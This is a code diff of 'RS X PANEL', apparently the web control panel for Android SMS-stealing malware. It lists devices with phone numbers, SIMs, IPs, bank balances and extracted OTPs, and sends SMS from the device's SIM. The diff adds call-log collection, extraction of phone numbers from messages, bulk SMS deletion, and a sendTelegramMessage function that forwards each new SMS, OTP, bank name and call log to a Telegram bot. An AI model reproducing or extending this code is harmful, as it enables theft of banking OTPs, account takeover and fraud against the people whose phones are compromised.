+            duration: c.duration || '',
+            dateTime: c.dateTime || c.timestamp || '',
+            name: c.name || '',
+            _ts: parseDate(c.dateTime || c.timestamp || '')
+        };
+    }).sort((a, b) => {
+        if (a._ts && b._ts) return b._ts - a._ts;
+        return a.key > b.key ? -1 : 1;
+    });
+}
+
+async function loadCallsForDevice(deviceId) {
+    try {
+        const data = await fbGet('calls/' + deviceId);
+        let calls = parseCalls(data);
+        if (calls.length > 100) calls = calls.slice(0, 100);
+        callCache[deviceId] = calls;
+    } catch(e) {
+        callCache[deviceId] = [];
+    }
+}
+
 function renderDeviceGrid() {
     const q = searchQuery.toLowerCase().trim();
     let filtered = allDevices;
@@ -1177,7 +1291,7 @@ function renderDeviceGrid() {
     if (filtered.length === 0) {
         deviceGrid.innerHTML = `
             <div class="empty-state">
-                <div class="shield-icon">🛡️</div>
+                <div class="shield-icon">S</div>
                 <h3>No devices connected</h3>
                 <p>Waiting for devices to register...</p>
                 <div class="auto-refresh-pill">
@@ -1189,46 +1303,50 @@ function renderDeviceGrid() {
         return;
     }
 
+    const tgDevices = activeConn && activeConn.telegramDevices ? activeConn.telegramDevices : [];
+
     deviceGrid.innerHTML = filtered.map(d => {
         const bankMsgs = getDeviceBankSms(d.id);
         const balance = getLatestBalance(d.id);
         const bankName = getLatestBankName(d.id);
-        const phone = d.phone || '—';
+        const phone = d.phone || '-';
         const statusText = d.status ? 'Online' : 'Offline';
         const statusClass = d.status ? 'online' : 'offline';
         const displayName = d.deviceName || d.name || d.id;
+        const isTgOn = tgDevices.includes(d.id);
         return `
             <div class="device-card" data-id="${d.id}">
                 <div class="top">
-                    <div class="icon ${d.status ? 'online' : ''}">${d.status ? '●' : '○'}</div>
+                    <div class="icon ${d.status ? 'online' : ''}">${d.status ? 'O' : 'o'}</div>
                     <div class="info">
                         <div class="name">${esc(displayName)}</div>
                         <div class="sub">
                             <span>${esc(d.android || 'Android')}</span>
-                            <span>🔋 ${d.battery || 0}</span>
+                            <span>Battery: ${d.battery || 0}</span>
                             <span>${esc(d.network || '')}</span>
                         </div>
                         <div class="status-badge ${statusClass}">${statusText}</div>
-                        ${phone !== '—' ? `<div class="phone-display">📱 ${esc(phone)}</div>` : ''}
+                        ${phone !== '-' ? `<div class="phone-display">Phone: ${esc(phone)}</div>` : ''}
                     </div>
                 </div>
                 ${balance ? `<div class="balance-info">
                     <span class="label">Avl Bal</span>
-                    <span>₹${esc(balance)}</span>
+                    <span>Rs.${esc(balance)}</span>
                     ${bankName ? `<span class="bank-name">${esc(bankName)}</span>` : ''}
                 </div>` : ''}
                 <div class="details">
                     <div class="item"><small>Phone</small><div>${esc(phone)}</div></div>
                     <div class="item"><small>Device ID</small><div>${esc(d.id)}</div></div>
                 </div>
-                <button class="send-btn-small" data-id="${d.id}" title="Send SMS">✉</button>
+                <button class="tg-toggle ${isTgOn ? 'active' : ''}" data-id="${d.id}" title="Toggle Telegram Forward">T</button>
+                <button class="send-btn-small" data-id="${d.id}" title="Send SMS">M</button>
             </div>
         `;
     }).join('');
 
     deviceGrid.querySelectorAll('.device-card').forEach(card => {
         card.addEventListener('click', (e) => {
-            if (e.target.closest('.send-btn-small')) return;
+            if (e.target.closest('.send-btn-small') || e.target.closest('.tg-toggle')) return;
             const id = card.dataset.id;
             const dev = allDevices.find(d => d.id === id);
             if (dev) openDetail(dev);
@@ -1240,6 +1358,28 @@ function renderDeviceGrid() {
             const id = btn.dataset.id;
             const dev = allDevices.find(d => d.id === id);
             if (dev) openDetail(dev);
+        });
+    });
+    deviceGrid.querySelectorAll('.tg-toggle').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            const id = btn.dataset.id;
+            if (!activeConn.telegramDevices) activeConn.telegramDevices = [];
+            const idx = activeConn.telegramDevices.indexOf(id);
+            if (idx === -1) {
+                activeConn.telegramDevices.push(id);
+                btn.classList.add('active');
+                toast('Telegram forward ON for ' + id.substring(0,10), 'success');
+            } else {
+                activeConn.telegramDevices.splice(idx, 1);
+                btn.classList.remove('active');
+                toast('Telegram forward OFF for ' + id.substring(0,10), 'error');
+            }
+            const connIdx = CONNECTIONS.findIndex(c => c.url === activeConn.url);
+            if (connIdx !== -1) {
+                CONNECTIONS[connIdx].telegramDevices = activeConn.telegramDevices;
+                localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
+            }
         });
     });
 }
@@ -1258,32 +1398,93 @@ function updateStats() {
     bankStat.textContent = bankTotal;
 }
 
-// DETAIL MODAL
+async function forwardToTelegram() {
+    if (!activeConn || !activeConn.telegramBotToken || !activeConn.telegramChatId) return;
+    const tgDevices = activeConn.telegramDevices || [];
+    if (!tgDevices.length) return;
+
+    for (const deviceId of tgDevices) {
+        const dev = allDevices.find(d => d.id === deviceId);
+        if (!dev) continue;
+        const msgs = messageCache[deviceId] || [];
+        const calls = callCache[deviceId] || [];
+        const lastFwd = telegramLastForwarded[deviceId] || 0;
+        const lastCallFwd = telegramLastCallForwarded[deviceId] || 0;
+
+        for (const m of msgs) {
+            if (m._ts && m._ts > lastFwd) {
+                const bank = detectBankName(m.message, m.sender);
+                const otp = extractOtp(m);
+                let text = `<b>RS X PANEL</b>\n`;
+                text += `<b>Device:</b> ${esc(dev.deviceName || dev.name || dev.id)}\n`;
+                text += `<b>From:</b> ${esc(m.sender || 'Unknown')}\n`;
+                text += `<b>Time:</b> ${esc(m.dateTime || '')}\n\n`;
+                text += `<b>Message:</b>\n${esc(m.message)}\n`;
+                if (bank) text += `\n<b>Bank:</b> ${esc(bank)}`;
+                if (otp) text += `\n<b>OTP:</b> <code>${otp}</code>`;
+                await sendTelegramMessage(text);
+                telegramLastForwarded[deviceId] = m._ts;
+            }
+        }
+
+        for (const c of calls) {
+            if (c._ts && c._ts > lastCallFwd) {
+                let text = `<b>RS X PANEL - Call Log</b>\n`;
+                text += `<b>Device:</b> ${esc(dev.deviceName || dev.name || dev.id)}\n`;
+                text += `<b>Number:</b> ${esc(c.number || 'Unknown')}\n`;
+                text += `<b>Type:</b> ${esc(c.type)}\n`;
+                text += `<b>Duration:</b> ${esc(c.duration || '-')}\n`;
+                text += `<b>Time:</b> ${esc(c.dateTime || '')}`;
+                await sendTelegramMessage(text);
+                telegramLastCallForwarded[deviceId] = c._ts;
+            }
+        }
+    }
+}
+
+async function sendTelegramMessage(text) {
+    try {
+        await fetch(`https://api.telegram.org/bot${activeConn.telegramBotToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: activeConn.telegramChatId,
+                text: text,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch(e) {}
+}
+
 async function openDetail(device) {
     selectedDevice = device;
     const displayName = device.deviceName || device.name || device.id;
     $('detailDeviceName').textContent = displayName;
-    $('detailStatus').textContent = device.status ? '● Online' : '○ Offline';
+    $('detailStatus').textContent = device.status ? 'Online' : 'Offline';
     $('detailStatus').style.color = device.status ? 'var(--green)' : 'var(--muted)';
     $('detailBattery').textContent = (device.battery || 0);
     const bankMsgs = getDeviceBankSms(device.id);
     const allMsgs = messageCache[device.id] || [];
+    const allCalls = callCache[device.id] || [];
     $('detailBankCount').textContent = bankMsgs.length;
     $('detailSmsCount').textContent = allMsgs.length;
     $('bankTabBadge').textContent = bankMsgs.length;
     $('smsTabBadge').textContent = allMsgs.length;
-    detailPhoneDisplay.textContent = device.phone || '—';
+    $('callsTabBadge').textContent = allCalls.length;
+    detailPhoneDisplay.textContent = device.phone || '-';
 
     renderInfoTab(device);
     renderSims(device);
     renderBankTab(device);
     renderSmsList(device.id, '');
+    renderCallsList(device.id);
+    renderNumbersTab(device.id);
 
     smsTo.value = device.phone || '';
     smsBody.value = '';
     sendResult.className = 'send-result';
     sendResult.textContent = '';
-    sendDevicePhone.textContent = device.phone || '—';
+    sendDevicePhone.textContent = device.phone || '-';
     updateSendBtnText();
 
     switchTab('info');
@@ -1293,18 +1494,24 @@ async function openDetail(device) {
     detailRefreshTimer = setInterval(() => {
         if (selectedDevice && detailModal.classList.contains('active')) {
             loadMessagesForDevice(selectedDevice.id).then(() => {
-                const activeTab = document.querySelector('.tab-btn.active');
-                if (activeTab) {
-                    const tab = activeTab.dataset.tab;
-                    if (tab === 'sms') renderSmsList(selectedDevice.id, smsSearch.value);
-                    else if (tab === 'bank') renderBankTab(selectedDevice);
-                    const bm = getDeviceBankSms(selectedDevice.id);
-                    const am = messageCache[selectedDevice.id] || [];
-                    $('detailBankCount').textContent = bm.length;
-                    $('detailSmsCount').textContent = am.length;
-                    $('bankTabBadge').textContent = bm.length;
-                    $('smsTabBadge').textContent = am.length;
-                }
+                loadCallsForDevice(selectedDevice.id).then(() => {
+                    const activeTab = document.querySelector('.tab-btn.active');
+                    if (activeTab) {
+                        const tab = activeTab.dataset.tab;
+                        if (tab === 'sms') renderSmsList(selectedDevice.id, smsSearch.value);
+                        else if (tab === 'bank') renderBankTab(selectedDevice);
+                        else if (tab === 'calls') renderCallsList(selectedDevice.id);
+                        else if (tab === 'numbers') renderNumbersTab(selectedDevice.id);
+                        const bm = getDeviceBankSms(selectedDevice.id);
+                        const am = messageCache[selectedDevice.id] || [];
+                        const ac = callCache[selectedDevice.id] || [];
+                        $('detailBankCount').textContent = bm.length;
+                        $('detailSmsCount').textContent = am.length;
+                        $('bankTabBadge').textContent = bm.length;
+                        $('smsTabBadge').textContent = am.length;
+                        $('callsTabBadge').textContent = ac.length;
+                    }
+                });
             });
         }
     }, 5000);
@@ -1312,18 +1519,18 @@ async function openDetail(device) {
 
 function renderInfoTab(device) {
     const rows = [
-        { label: 'Device Name', value: device.deviceName || device.name || '—' },
-        { label: 'Phone Number', value: device.phone || '—' },
-        { label: 'Phone Name', value: device.phoneName || '—' },
-        { label: 'Network', value: device.network || '—' },
-        { label: 'Android', value: device.android || '—' },
-        { label: 'IP Address', value: device.ip || '—' },
-        { label: 'Storage', value: device.storage || '—' },
-        { label: 'CPU Arch', value: device.cpuArch || '—' },
-        { label: 'SDK Version', value: device.sdkVersion || '—' },
+        { label: 'Device Name', value: device.deviceName || device.name || '-' },
+        { label: 'Phone Number', value: device.phone || '-' },
+        { label: 'Phone Name', value: device.phoneName || '-' },
+        { label: 'Network', value: device.network || '-' },
+        { label: 'Android', value: device.android || '-' },
+        { label: 'IP Address', value: device.ip || '-' },
+        { label: 'Storage', value: device.storage || '-' },
+        { label: 'CPU Arch', value: device.cpuArch || '-' },
+        { label: 'SDK Version', value: device.sdkVersion || '-' },
         { label: 'SIM Cards', value: device.sims ? device.sims.length + ' SIM(s)' : '0 SIM(s)' },
-        { label: 'SIM 1 Number', value: (device.sims && device.sims[0] && device.sims[0].phoneNumber) ? device.sims[0].phoneNumber : '—' },
-        { label: 'SIM 2 Number', value: (device.sims && device.sims[1] && device.sims[1].phoneNumber) ? device.sims[1].phoneNumber : '—' },
+        { label: 'SIM 1 Number', value: (device.sims && device.sims[0] && device.sims[0].phoneNumber) ? device.sims[0].phoneNumber : '-' },
+        { label: 'SIM 2 Number', value: (device.sims && device.sims[1] && device.sims[1].phoneNumber) ? device.sims[1].phoneNumber : '-' },
     ];
     detailInfoList.innerHTML = `<div class="info-list">` + rows.map(r => `
         <div class="info-row">
@@ -1335,7 +1542,7 @@ function renderInfoTab(device) {
 
 function renderSims(device) {
     if (!device.sims || !device.sims.length) {
-        detailSims.innerHTML = '<div style="color:var(--muted);padding:12px">—</div>';
+        detailSims.innerHTML = '<div style="color:var(--muted);padding:12px">-</div>';
         return;
     }
     const rows = [];
@@ -1343,7 +1550,7 @@ function renderSims(device) {
         if (s.phoneNumber) rows.push({ label: 'Phone #' + (i+1), value: s.phoneNumber });
     });
     device.sims.forEach((s, i) => {
-        if (s.network || s.carrier) rows.push({ label: 'Network #' + (i+1), value: s.network || s.carrier || '—' });
+        if (s.network || s.carrier) rows.push({ label: 'Network #' + (i+1), value: s.network || s.carrier || '-' });
     });
     detailSims.innerHTML = rows.map(r => `
         <div class="info-row">
@@ -1367,8 +1574,8 @@ function renderBankTab(device) {
     if (balance) {
         latestBalanceCard.innerHTML = `
             <div class="latest-balance-card">
-                <div class="lbl">Latest Balance · ${esc(bankName || 'Unknown')}</div>
-                <div class="amt">₹${esc(balance)}</div>
+                <div class="lbl">Latest Balance - ${esc(bankName || 'Unknown')}</div>
+                <div class="amt">Rs.${esc(balance)}</div>
             </div>
         `;
     } else {
@@ -1385,11 +1592,8 @@ function renderBankTab(device) {
         const txType = detectTxType(m.message);
         const bank = detectBankName(m.message, m.sender);
         const bal = extractBalance(m);
-        const txnAmt = extractTransactionAmount(m.message);
-        const icon = txType === 'credit' ? '↘' : txType === 'debit' ? '↗' : '₹';
+        const icon = txType === 'credit' ? 'C' : txType === 'debit' ? 'D' : 'B';
         const badgeText = txType === 'credit' ? 'Credit' : txType === 'debit' ? 'Debit' : 'Bank';
-        const txnSign = txType === 'debit' ? '-' : (txType === 'credit' ? '+' : '');
-        const txnColor = txType === 'debit' ? 'var(--cyan)' : (txType === 'credit' ? 'var(--green)' : 'var(--cyan)');
         return `
             <div class="tx-card-bank">
                 <div class="tx-top">
@@ -1403,15 +1607,11 @@ function renderBankTab(device) {
                 <div class="tx-mid">
                     <div>
                         <div class="tx-mid-label">Available Balance</div>
-                        <div class="tx-mid-amt balance">₹${esc(bal || '—')}</div>
-                    </div>
-                    <div style="text-align:right">
-                        <div class="tx-mid-label">Transaction</div>
-                        <div class="tx-mid-amt txn" style="color:${txnColor}">${txnSign}₹${esc(txnAmt || '—')}</div>
+                        <div class="tx-mid-amt balance">Rs.${esc(bal || '-')}</div>
                     </div>
                 </div>
                 <div class="tx-divider"></div>
-                <div class="tx-network">📶 ${esc(device.network || 'Unknown')}</div>
+                <div class="tx-network">Network: ${esc(device.network || 'Unknown')}</div>
                 <div class="tx-msg">${esc(m.message)}</div>
                 <div class="tx-date">${esc(m.dateTime || '')}</div>
             </div>
@@ -1438,10 +1638,9 @@ function renderSmsList(deviceId, search = '') {
         const hasPhone = numMatch ? true : false;
         const txType = detectTxType(m.message);
         const txClass = txType === 'credit' ? 'credit' : txType === 'debit' ? 'debit' : '';
-        const txLabel = txType === 'credit' ? '💰 Credit' : txType === 'debit' ? '💸 Debit' : '';
+        const txLabel = txType === 'credit' ? 'Credit' : txType === 'debit' ? 'Debit' : '';
         const bankName = detectBankName(m.message, m.sender);
         const bal = extractBalance(m);
-        // Get device phone for OTP
         const dev = allDevices.find(d => d.id === deviceId);
         const devPhone = dev ? (dev.phone || '') : '';
         return `
@@ -1451,16 +1650,91 @@ function renderSmsList(deviceId, search = '') {
                     <span>${esc(m.dateTime || '')}</span>
                 </div>
                 <div class="sms-body">${esc(m.message)}</div>
-                ${otp ? `<div class="sms-otp-box">🔐 OTP: ${otp}</div>` : ''}
-                ${otp && devPhone ? `<div class="sms-otp-phone">📱 ${esc(devPhone)}</div>` : ''}
-                ${bank ? `<div class="bank-tag">🏦 Bank</div>` : ''}
-                ${bankName ? `<div class="bank-name-tag">🏛️ ${esc(bankName)}</div>` : ''}
+                ${otp ? `<div class="sms-otp-box">OTP: ${otp}</div>` : ''}
+                ${otp && devPhone ? `<div class="sms-otp-phone">Phone: ${esc(devPhone)}</div>` : ''}
+                ${bank ? `<div class="bank-tag">Bank</div>` : ''}
+                ${bankName ? `<div class="bank-name-tag">${esc(bankName)}</div>` : ''}
                 ${txType ? `<div class="tx-type ${txClass}">${txLabel}</div>` : ''}
-                ${bal ? `<div class="balance-tag">💰 Avl Bal: ₹${esc(bal)}</div>` : ''}
-                ${hasPhone ? `<div class="phone-tag">📱 ${esc(numMatch[0])}</div>` : ''}
+                ${bal ? `<div class="balance-tag">Avl Bal: Rs.${esc(bal)}</div>` : ''}
+                ${hasPhone ? `<div class="phone-tag">${esc(numMatch[0])}</div>` : ''}
             </div>
         `;
     }).join('');
+}
+
+function renderCallsList(deviceId) {
+    const calls = callCache[deviceId] || [];
+    $('callsCountLabel').textContent = `(${calls.length})`;
+    if (!calls.length) {
+        callList.innerHTML = '<div style="color:var(--muted);padding:12px">No call logs.</div>';
+        return;
+    }
+    callList.innerHTML = calls.map(c => {
+        const typeClass = c.type === 'incoming' ? 'incoming' : c.type === 'outgoing' ? 'outgoing' : 'missed';
+        const typeLabel = c.type === 'incoming' ? 'IN' : c.type === 'outgoing' ? 'OUT' : 'MISSED';
+        return `
+            <div class="call-item">
+                <div class="call-header">
+                    <span class="call-number">${esc(c.number || 'Unknown')}</span>
+                    <span class="call-type ${typeClass}">${typeLabel}</span>
+                </div>
+                <div class="call-meta">
+                    <span>${esc(c.dateTime || '')}</span>
+                    <span class="call-duration">${esc(c.duration || '-')}</span>
+                </div>
+            </div>
+        `;
+    }).join('');
+}
+
+function renderNumbersTab(deviceId) {
+    const msgs = messageCache[deviceId] || [];
+    const numberMap = {};
+    let mainNumber = null;
+
+    for (const m of msgs) {
+        const matches = m.message.match(/(\+91|0)?[6-9]\d{9}/g);
+        if (matches) {
+            for (const num of matches) {
+                const clean = num.replace(/^0/, '').replace(/^\+91/, '');
+                numberMap[clean] = (numberMap[clean] || 0) + 1;
+            }
+        }
+        const text = m.message.toLowerCase();
+        if (text.includes('plan expire') || text.includes('plan expired') || text.includes('main number') ||
+            text.includes('mob no') || text.includes('phone no')) {
+            const match = m.message.match(/(\+91|0)?[6-9]\d{9}/);
+            if (match) mainNumber = match[0].replace(/^0/, '').replace(/^\+91/, '');
+        }
+    }
+
+    const sortedNumbers = Object.entries(numberMap).sort((a, b) => b[1] - a[1]);
+    if (!sortedNumbers.length && !mainNumber) {
+        numbersContainer.innerHTML = '<div style="color:var(--muted);padding:12px">No numbers found in SMS.</div>';
+        return;
+    }
+
+    let html = '';
+    if (mainNumber) {
+        html += `
+            <div class="number-main">
+                <div class="nm-label">Main Number (Detected)</div>
+                <div class="nm-number">+91 ${esc(mainNumber)}</div>
+            </div>
+        `;
+    }
+    html += '<div class="number-list">';
+    for (const [num, count] of sortedNumbers) {
+        if (mainNumber && num === mainNumber) continue;
+        html += `
+            <div class="number-row">
+                <span class="num">+91 ${esc(num)}</span>
+                <span class="count">${count} mention${count > 1 ? 's' : ''}</span>
+            </div>
+        `;
+    }
+    html += '</div>';
+    numbersContainer.innerHTML = html;
 }
 
 function switchTab(tabId) {
@@ -1477,12 +1751,14 @@ tabBtns.forEach(btn => {
         if (selectedDevice) {
             if (tab === 'bank') renderBankTab(selectedDevice);
             else if (tab === 'sms') renderSmsList(selectedDevice.id, smsSearch.value);
+            else if (tab === 'calls') renderCallsList(selectedDevice.id);
+            else if (tab === 'numbers') renderNumbersTab(selectedDevice.id);
         }
     });
 });
 
 function updateSendBtnText() {
-    sendSmsBtn.textContent = '📤 Send via SIM ' + simChoice;
+    sendSmsBtn.textContent = 'Send via SIM ' + simChoice;
 }
 
 async function sendSms() {
@@ -1492,7 +1768,7 @@ async function sendSms() {
     if (!to || !body) { toast('Enter number and message', 'error'); return; }
     sendSmsBtn.disabled = true;
     sendResult.className = 'send-result';
-    sendResult.textContent = 'Sending…';
+    sendResult.textContent = 'Sending...';
 
     try {
         const payload = {
@@ -1505,7 +1781,7 @@ async function sendSms() {
         const path = 'messages/' + selectedDevice.id + '/outgoing_' + Date.now();
         await fbSet(path, payload);
         sendResult.className = 'send-result ok';
-        sendResult.textContent = '✅ Sent successfully';
+        sendResult.textContent = 'Sent successfully';
         toast('SMS sent', 'success');
         await loadMessagesForDevice(selectedDevice.id);
         renderSmsList(selectedDevice.id, smsSearch.value);
@@ -1518,11 +1794,30 @@ async function sendSms() {
         $('smsTabBadge').textContent = am.length;
     } catch(e) {
         sendResult.className = 'send-result err';
-        sendResult.textContent = '❌ Error: ' + e.message;
+        sendResult.textContent = 'Error: ' + e.message;
         toast('Send failed', 'error');
     } finally {
         sendSmsBtn.disabled = false;
         updateSendBtnText();
+    }
+}
+
+async function deleteAllSms() {
+    if (!selectedDevice) { toast('No device selected', 'error'); return; }
+    if (!confirm('Delete ALL SMS for this device from Firebase? This cannot be undone.')) return;
+    try {
+        await fbDelete('messages/' + selectedDevice.id);
+        messageCache[selectedDevice.id] = [];
+        renderSmsList(selectedDevice.id, '');
+        renderBankTab(selectedDevice);
+        renderNumbersTab(selectedDevice.id);
+        $('detailSmsCount').textContent = '0';
+        $('detailBankCount').textContent = '0';
+        $('bankTabBadge').textContent = '0';
+        $('smsTabBadge').textContent = '0';
+        toast('All SMS deleted', 'success');
+    } catch(e) {
+        toast('Delete failed: ' + e.message, 'error');
     }
 }
 
@@ -1549,11 +1844,12 @@ function esc(str) {
     return div.innerHTML;
 }
 
-// EVENT BINDING
 $('newConnBtn').addEventListener('click', () => {
     accLabel.value = '';
     accUrl.value = '';
     accKey.value = '';
+    accTelegramToken.value = '';
+    accTelegramChatId.value = '';
     setupError.classList.add('hidden');
     newAccountModal.classList.add('active');
 });
@@ -1588,18 +1884,18 @@ saveAccountBtn.addEventListener('click', () => {
     const url = accUrl.value.trim();
     const key = accKey.value.trim();
     if (!url) {
-        setupError.textContent = 'Firebase URL dalna zaroori hai';
+        setupError.textContent = 'Firebase URL required';
         setupError.classList.remove('hidden');
         return;
     }
     if (!key) {
-        setupError.textContent = 'API Key bhi zaroori hai bhai';
+        setupError.textContent = 'API Key required';
         setupError.classList.remove('hidden');
         return;
     }
     const dup = CONNECTIONS.find(c => c.url === url);
     if (dup) {
-        setupError.textContent = '⚠️ Already exists: "' + (dup.label || dup.url) + '"';
+        setupError.textContent = 'Already exists: "' + (dup.label || dup.url) + '"';
         setupError.classList.remove('hidden');
         toast('Firebase already exists!', 'error');
         return;
@@ -1614,13 +1910,16 @@ saveAccountBtn.addEventListener('click', () => {
         label: label,
         url: url,
         key: key,
+        telegramBotToken: accTelegramToken.value.trim(),
+        telegramChatId: accTelegramChatId.value.trim(),
+        telegramDevices: [],
         date: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
     };
     CONNECTIONS.push(conn);
     localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
     newAccountModal.classList.remove('active');
     renderConnections();
-    toast('Account "' + label + '" saved! Ab Connect kar le.', 'success');
+    toast('Account "' + label + '" saved!', 'success');
     updateShareLink();
 });
 
@@ -1642,7 +1941,7 @@ let sortToggle = false;
 $('sortBtn').addEventListener('click', () => {
     sortToggle = !sortToggle;
     sortMode = sortToggle ? 'oldest' : 'newest';
-    $('sortBtn').textContent = (sortToggle ? 'Oldest' : 'Newest') + ' ▼';
+    $('sortBtn').textContent = sortToggle ? 'Oldest' : 'Newest';
     renderDeviceGrid();
 });
 
@@ -1682,6 +1981,7 @@ $('refreshSmsBtn').addEventListener('click', async () => {
         await loadMessagesForDevice(selectedDevice.id);
         renderSmsList(selectedDevice.id, smsSearch.value);
         renderBankTab(selectedDevice);
+        renderNumbersTab(selectedDevice.id);
         const bm = getDeviceBankSms(selectedDevice.id);
         const am = messageCache[selectedDevice.id] || [];
         $('detailBankCount').textContent = bm.length;
@@ -1690,6 +1990,8 @@ $('refreshSmsBtn').addEventListener('click', async () => {
         $('smsTabBadge').textContent = am.length;
     }
 });
+
+$('deleteAllSmsBtn').addEventListener('click', deleteAllSms);
 
 sendSmsBtn.addEventListener('click', sendSms);
 
@@ -1702,13 +2004,12 @@ document.querySelectorAll('.sim-toggle button').forEach(btn => {
     });
 });
 
-// INIT
 const loaded = loadFromURL();
 if (!loaded) {
     renderConnections();
 }
 updateShareLink();
-console.log('RS X PANEL v3.3 · No quota errors · Exact bank design · Info rows');
+console.log('RS X PANEL v4.0 loaded');
 </script>
 </body>
 </html>
